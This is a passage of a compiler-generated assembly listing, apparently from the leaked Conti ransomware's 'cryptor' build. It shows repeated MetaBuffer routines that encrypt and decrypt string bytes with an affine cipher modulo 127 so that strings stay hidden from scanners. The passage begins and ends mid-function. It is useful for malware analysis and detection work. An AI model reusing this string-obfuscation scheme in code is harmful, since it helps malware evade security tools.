  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ENDP ; MetaBuffer<37,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ PROC ; MetaBuffer<37,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ ENDP ; MetaBuffer<37,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CP@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CP@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<47,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 1b 00 00 00	 mov	 ecx, 27
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 1b	 imul	 r8d, ecx, 27

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CP@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<47,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CP@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CP@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<47,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 2f	 imul	 r8d, eax, 47		; 0000002fH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 1b	 add	 r8d, 27
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CP@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<47,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CP@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CP@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<47,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CP@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<47,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0HE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DF@$0HE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,116,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 74	 sub	 eax, 116		; 00000074H
  00006	44 8d 04 40	 lea	 r8d, DWORD PTR [rax+rax*2]

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0HE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,116,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DF@$0HE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DF@$0HE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,116,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 35	 imul	 r8d, eax, 53		; 00000035H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 74	 add	 r8d, 116		; 00000074H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DF@$0HE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,116,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DF@$0HE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DF@$0HE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ PROC ; MetaBuffer<53,116,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DF@$0HE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ ENDP ; MetaBuffer<53,116,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BH@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BH@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<23,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 6b 00 00 00	 mov	 ecx, 107		; 0000006bH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 0b	 imul	 r8d, ecx, 11

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BH@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<23,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BH@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BH@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<23,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 17	 imul	 r8d, eax, 23
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 6b	 add	 r8d, 107		; 0000006bH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BH@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<23,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BH@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BH@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ PROC ; MetaBuffer<23,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BH@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<23,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0HB@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0HB@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<113,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 54	 sub	 eax, 84			; 00000054H
  00006	44 8d 04 c0	 lea	 r8d, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0HB@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<113,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0HB@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0HB@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<113,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 71	 imul	 r8d, eax, 113		; 00000071H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 54	 add	 r8d, 84			; 00000054H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0HB@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<113,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0HB@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0HB@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<113,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0HB@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<113,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$04U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CJ@$04U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,5,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 05	 sub	 eax, 5
  00006	44 6b c0 1f	 imul	 r8d, eax, 31

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$04U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,5,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CJ@$04U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CJ@$04U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,5,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 05	 add	 r8d, 5
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CJ@$04U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,5,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CJ@$04U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CJ@$04U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<41,5,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CJ@$04U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<41,5,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FJ@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0FJ@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<89,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 50	 sub	 eax, 80			; 00000050H
  00006	44 8d 04 80	 lea	 r8d, DWORD PTR [rax+rax*4]

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

